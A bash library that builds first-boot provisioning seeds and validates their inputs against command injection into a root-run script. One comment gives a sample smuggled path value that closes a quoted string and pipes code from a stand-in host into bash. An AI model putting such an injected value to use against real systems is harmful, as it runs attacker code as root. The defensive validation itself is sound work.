#!/usr/bin/env bash
#
# seed-lib.sh — what every flash seed builder shares.
#
# SOURCED, never executed. scripts/internal/seed-<role>.sh sources this, then
# writes the files its role's installer expects. The two roles disagree about
# almost everything in the seed — one replaces a NoCloud seed inside an ext4
# rootfs, the other hands an autoinstall answer file to a desktop installer —
# and agree about exactly three things: how a flag becomes a value, how a value
# is quoted into YAML, and what the first boot must do once the OS is up.
#
# Those three live here so that a change to the provisioning chain lands in one
# file rather than once per role, and so a role added later inherits it.
#
# Every value the builders take arrives through fm_seed_parse_args and lands in
# a SEED_* global. They are globals rather than arguments because the set is
# large, is identical across roles, and is read by the first-boot builder five
# call frames from where it was parsed. A value only one role has — a wifi PSK,
# a password hash — is declared by that role's builder instead.
#
# SEED_HOSTNAME is read by the sourcing builder rather than by this file.
# shellcheck disable=SC2034

if ! (return 0 2>/dev/null); then
  echo "seed-lib.sh is a function library; source it, do not execute it." >&2
  exit 1
fi

# --- The parsed seed request ------------------------------------------------

SEED_OUT=""
SEED_NAME=""
SEED_HOSTNAME=""
SEED_USER="${FM_FLASH_USER:-fm}"
SEED_FLEET="${FM_MACHINE_FLEET_DEFAULT:-prod}"
SEED_TRANSPORT="${FM_MACHINE_TRANSPORTS[0]:-zenoh}"
SEED_WORKLOAD=""
SEED_WORKSPACE=""
SEED_AUTHORIZED_KEYS=""
SEED_GH_TOKEN="${FM_GH_TOKEN:-}"
SEED_TS_AUTHKEY="${FM_TS_AUTHKEY:-}"
SEED_SETUP_URL=""
SEED_ROS2_URL=""
SEED_PROVISION=1

# fm_seed_usage_common — the flag block every seed builder documents.
fm_seed_usage_common() {
  cat <<'EOF'
  --out <dir>              (required) directory the seed files are written to
  --name <fm-xx-nn>        machine name, which is also the hostname and the
                           stem of the ROS namespace
  --user <name>            the account the machine answers on
  --fleet <name>           population this machine joins
  --transport <profile>    middleware profile on the identity card
  --workload <kind>        what the machine does, or `none`
  --workspace <path>       where every First Motive checkout lives
  --authorized-keys <file> file of SSH public keys, one per line
  --gh-token <token>       read-only PAT for the private overlays
  --tailscale-authkey <k>  join the tailnet on first boot
  --setup-url <url>        machine-layer install.sh, pinned to a release tag
  --ros2-url <url>         workspace-layer install.sh, pinned the same way
  --no-provision           identity only — no first-boot install chain
EOF
}

# fm_seed_parse_args ARG… — consume the flags above into the SEED_* globals.
#
# Leaves any argument it does not recognise in SEED_REST, so a role's own flag
# (--wifi on the jetson, --password-hash on the workstation) is parsed by the
# role that has it rather than by everyone.
#
# SEED_REST rather than stdout, because a caller reading the leftovers out of a
# command substitution would run this in a subshell and lose every SEED_* value
# it just parsed.
SEED_REST=()
fm_seed_parse_args() {
  SEED_REST=()
  while [ $# -gt 0 ]; do
    case "$1" in
      --out)               SEED_OUT="${2:?--out needs a value}"; shift 2 ;;
      --name)              SEED_NAME="${2:?--name needs a value}"; shift 2 ;;
      --user)              SEED_USER="${2:?--user needs a value}"; shift 2 ;;
      --fleet)             SEED_FLEET="${2:?--fleet needs a value}"; shift 2 ;;
      --transport)         SEED_TRANSPORT="${2:?--transport needs a value}"; shift 2 ;;
      --workload)          SEED_WORKLOAD="${2:?--workload needs a value}"; shift 2 ;;
      --workspace)         SEED_WORKSPACE="${2:?--workspace needs a value}"; shift 2 ;;
      --authorized-keys)   SEED_AUTHORIZED_KEYS="${2:?--authorized-keys needs a value}"; shift 2 ;;
      --gh-token)          SEED_GH_TOKEN="${2:?--gh-token needs a value}"; shift 2 ;;
      --tailscale-authkey) SEED_TS_AUTHKEY="${2:?--tailscale-authkey needs a value}"; shift 2 ;;
      --setup-url)         SEED_SETUP_URL="${2:?--setup-url needs a value}"; shift 2 ;;
      --ros2-url)          SEED_ROS2_URL="${2:?--ros2-url needs a value}"; shift 2 ;;
      --no-provision)      SEED_PROVISION=0; shift ;;
      *) SEED_REST+=("$1"); shift ;;
    esac
  done
}

# fm_seed_valid_url FLAG URL — refuse a URL that could not survive being pasted
# into a root-run shell script.
#
# Both install URLs are interpolated, unquoted, into the first-boot script's
# `curl … | bash`, so a value carrying a quote closes the string it sits in and
# the rest of it becomes commands that run as root on the first boot. https only,
# because these fetch the code that provisions the machine.
#
# No query string in the allowed set. A raw.githubusercontent URL has none, and
# `&` and `?` are exactly the characters that turn one interpolated string into
# two commands.
fm_seed_valid_url() {
  local flag="$1" url="$2"
  local LC_ALL=C
  case "$url" in
    https://*) ;;
    *) fm_err "$flag must be an https URL: '$url'"; return 1 ;;
  esac
  case "$url" in
    *[!A-Za-z0-9._~:/%+-]*) fm_err "$flag has characters a URL may not carry: '$url'"; return 1 ;;
  esac
}

# fm_seed_require ROLE — check what every role needs before a file is written.
#
# The seed is the one artefact nobody can correct afterwards: it is baked onto
# media and handed to a machine that is not yet reachable. So every value is
# validated here, against the same functions `machine init` uses, rather than
# discovered on the box hours later.
fm_seed_require() {
  local role="$1"
  [ -n "$SEED_OUT" ] || { fm_err "--out is required"; return 1; }
  [ -d "$SEED_OUT" ] || { fm_err "no such directory: $SEED_OUT"; return 1; }
  [ -n "$SEED_NAME" ] || { fm_err "--name is required"; return 1; }
  SEED_HOSTNAME="$SEED_NAME"

  fm_machine_valid_name "$SEED_NAME" "$role"
  fm_machine_valid_fleet "$SEED_FLEET"
  fm_machine_valid_transport "$SEED_TRANSPORT"
  SEED_WORKLOAD="$(fm_machine_workload_value "$SEED_WORKLOAD")"
  fm_machine_valid_workload "$SEED_WORKLOAD"
  [ -n "$SEED_WORKSPACE" ] || SEED_WORKSPACE="/home/$SEED_USER/fm"
  fm_machine_valid_workspace "$SEED_WORKSPACE"

  # LC_ALL=C: a glob range follows the locale's collation, and under a UTF-8
  # locale a-z also matches uppercase — which would let an uppercase username
  # through onto media before anyone sees it.
  local LC_ALL=C
  case "$SEED_USER" in
    *[!a-z0-9-]*|""|-*) fm_err "invalid user: '$SEED_USER' (lowercase letters, digits, hyphens)"; return 1 ;;
  esac

  # The workspace is interpolated into `mkdir -p … && cd …` in the first-boot
  # script, which runs as root. fm_machine_valid_workspace above only asks
  # whether the path is absolute, which `/home/fm"; curl evil | bash; "` also is.
  #
  # Checked here rather than by widening that validator: a card written by
  # `machine init` on a running host is typed by the person the shell belongs
  # to, while this one is typed by whoever builds a seed and is executed on a
  # different machine as root.
  case "$SEED_WORKSPACE" in
    *[!A-Za-z0-9._/-]*) fm_err "invalid workspace: '$SEED_WORKSPACE' (letters, digits, . _ - and /)"; return 1 ;;
  esac

  [ -n "$SEED_AUTHORIZED_KEYS" ] || {
    fm_err "--authorized-keys is required"
    fm_info "the seed locks password login, so a key is the only door in"
    return 1
  }
  [ -f "$SEED_AUTHORIZED_KEYS" ] || { fm_err "no such key file: $SEED_AUTHORIZED_KEYS"; return 1; }
  grep -q '[^[:space:]]' "$SEED_AUTHORIZED_KEYS" || {
    fm_err "no SSH public key in $SEED_AUTHORIZED_KEYS"; return 1; }

  # Both secrets are interpolated into the first-boot script, which runs as root
  # on a machine already in someone's hands, so a value carrying a quote closes
  # the string it sits in and the rest of it becomes commands.
  case "$SEED_GH_TOKEN" in *[!A-Za-z0-9_-]*) fm_err "--gh-token looks malformed"; return 1 ;; esac
  case "$SEED_TS_AUTHKEY" in *[!A-Za-z0-9_-]*) fm_err "--tailscale-authkey looks malformed"; return 1 ;; esac

  if [ "$SEED_PROVISION" = 1 ]; then
    [ -n "$SEED_SETUP_URL" ] || { fm_err "--setup-url is required unless --no-provision"; return 1; }
    [ -n "$SEED_ROS2_URL" ]  || { fm_err "--ros2-url is required unless --no-provision"; return 1; }
    fm_seed_valid_url --setup-url "$SEED_SETUP_URL"
    fm_seed_valid_url --ros2-url  "$SEED_ROS2_URL"
  fi
}

# --- YAML -------------------------------------------------------------------

# Quote a value for YAML: double-quoted, with backslash, quote, and newline
# escaping — a newline smuggled into an ssid/psk must not become YAML structure.
fm_seed_yaml_quote() {
  local s="$1"
  s="${s//\\/\\\\}"
  s="${s//\"/\\\"}"
  s="${s//$'\n'/\\n}"
  s="${s//$'\r'/\\r}"
  printf '"%s"' "$s"
}

# fm_seed_authorized_keys_yaml INDENT — the keys as a YAML sequence.
fm_seed_authorized_keys_yaml() {
  local indent="$1" line
  while IFS= read -r line; do
    [ -n "$line" ] && printf '%s- %s\n' "$indent" "$line"
  done <"$SEED_AUTHORIZED_KEYS"
}

# --- First boot -------------------------------------------------------------

# The first-boot script cloud-init writes to the machine and runs once.
#
# A failed layer stops the chain and leaves a marker (FM_FIRST_BOOT_FAILED, read
# by `machine doctor`) naming the step. It never prints "done" after a failure:
# an unattended machine that fails and reports done is the omission class this
# repo exists to remove (#28). SSH is up before this script runs, so stopping
# here still leaves a reachable machine.
#
# ROLE selects the two install flags, which is the only part of the chain that
# differs between a capture rig and a workstation.
fm_seed_first_boot() {
  local role="$1" machine_flag workspace_flag
  # The machine layer's flag is the role's own name; the workspace layer's comes
  # from the manifest, because a rig records and a workstation processes and
  # neither name follows from the other.
  machine_flag="--$role"
  workspace_flag="$(fm_flash_workspace_flag "$role")" || return 1

  cat <<EOF
#!/usr/bin/env bash
set -uo pipefail
exec >>/var/log/fm-first-boot.log 2>&1
echo "== fm first boot: \$(date) =="
export NONINTERACTIVE=1
rm -f "$FM_FIRST_BOOT_FAILED"
fail() {
  mkdir -p "\$(dirname "$FM_FIRST_BOOT_FAILED")"
  printf '%s\\n' "\$1" >"$FM_FIRST_BOOT_FAILED"
  echo "== fm first boot FAILED at: \$1 (\$(date)) =="
  exit 1
}
EOF
  if [ -n "$SEED_GH_TOKEN" ]; then
    cat <<EOF
install -o "$SEED_USER" -g "$SEED_USER" -m 0600 /dev/null "/home/$SEED_USER/.git-credentials"
printf 'https://x-access-token:%s@github.com\n' '$SEED_GH_TOKEN' >"/home/$SEED_USER/.git-credentials"
sudo -u "$SEED_USER" -H git config --global credential.helper store
EOF
  fi
  cat <<EOF
echo "-- machine layer: fm-setup $machine_flag"
machine_rc=0
sudo -u "$SEED_USER" -H bash -c 'curl -fsSL --proto "=https" $SEED_SETUP_URL | bash -s -- $machine_flag -y' || machine_rc=\$?
EOF
  # The join runs before the machine layer's failure is acted on: a machine that
  # failed mid-provision is worth far more on the tailnet than off it, and the
  # tailscale step sits early enough in either role that a later failure leaves
  # the binary in place (#28).
  if [ -n "$SEED_TS_AUTHKEY" ]; then
    cat <<EOF
echo "-- tailscale join"
if command -v tailscale >/dev/null; then
  tailscale up --ssh --authkey '$SEED_TS_AUTHKEY' || echo "tailscale join failed; run 'sudo tailscale up --ssh' by hand"
else
  echo "tailscale not installed — join skipped"
fi
EOF
  fi
  cat <<EOF
[ "\$machine_rc" -eq 0 ] || fail "machine layer (fm-setup $machine_flag, exit \$machine_rc)"
EOF
  if [ -n "$SEED_GH_TOKEN" ]; then
    cat <<EOF
echo "-- workspace layer: fm_ros2 $workspace_flag --service"
sudo -u "$SEED_USER" -H bash -c 'mkdir -p $SEED_WORKSPACE && cd $SEED_WORKSPACE && curl -fsSL --proto "=https" $SEED_ROS2_URL | bash -s -- $workspace_flag --service' \
  || fail "workspace layer (fm_ros2 $workspace_flag --service)"
EOF
  else
    cat <<EOF
cat >"/home/$SEED_USER/NEXT-STEP.md" <<'NOTE'
Machine layer is provisioned. The workspace layer needs first-motive org access:
  gh auth login    # or place an SSH key
  mkdir -p $SEED_WORKSPACE && cd $SEED_WORKSPACE
  curl -fsSL --proto "=https" $SEED_ROS2_URL | bash -s -- $workspace_flag --service
NOTE
chown "$SEED_USER:$SEED_USER" "/home/$SEED_USER/NEXT-STEP.md"
echo "-- no --gh-token: workspace layer deferred (see ~/NEXT-STEP.md)"
EOF
  fi
  cat <<EOF
echo "== fm first boot done: \$(date) =="
EOF
}

# --- The identity card ------------------------------------------------------

# fm_seed_card ROLE INDENT — the identity card, indented into a YAML block.
#
# Seeded whether or not the install chain runs. It is what the machine *is*, not
# part of provisioning it: a card-less machine cannot derive a namespace, does
# not know its own workspace, and cannot be told apart from the next one off the
# same command.
fm_seed_card() {
  local role="$1" indent="$2"
  fm_machine_card_literal \
    "$SEED_NAME" "$role" "$SEED_FLEET" "$SEED_TRANSPORT" \
    "$SEED_WORKLOAD" "$SEED_WORKSPACE" | sed "s/^/$indent/"
}
